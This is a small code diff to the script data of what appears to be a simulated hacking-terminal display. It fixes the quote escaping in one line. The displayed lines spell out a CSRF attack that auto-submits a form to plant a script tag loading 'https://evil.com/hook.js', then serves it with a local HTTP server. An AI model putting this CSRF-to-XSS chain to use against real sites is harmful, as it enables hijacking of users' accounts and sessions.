@@ -1669,7 +1669,7 @@ const simulationScripts = {
     { text: "root@kali:~# cat exploit.html", type: "cmd", delay: 800 },
     { text: "<!-- Attack Chain: CSRF to trigger Self-XSS -->", type: "info", delay: 200 },
     { text: "<form id='f' action='https://api.target.com/user/address' method='POST'>", type: "output", delay: 100 },
-    { text: "  <input type='hidden' name='city' value='<script src="https://evil.com/hook.js"></script>'>", type: "output", delay: 100 },
+    { text: "  <input type='hidden' name='city' value='<script src=\\"https://evil.com/hook.js\\"></script>'>", type: "output", delay: 100 },
     { text: "</form>", type: "output", delay: 100 },
     { text: "<script>document.getElementById('f').submit();</script>", type: "output", delay: 100 },
     { text: "root@kali:~# python3 -m http.server 80", type: "cmd", delay: 1200 },
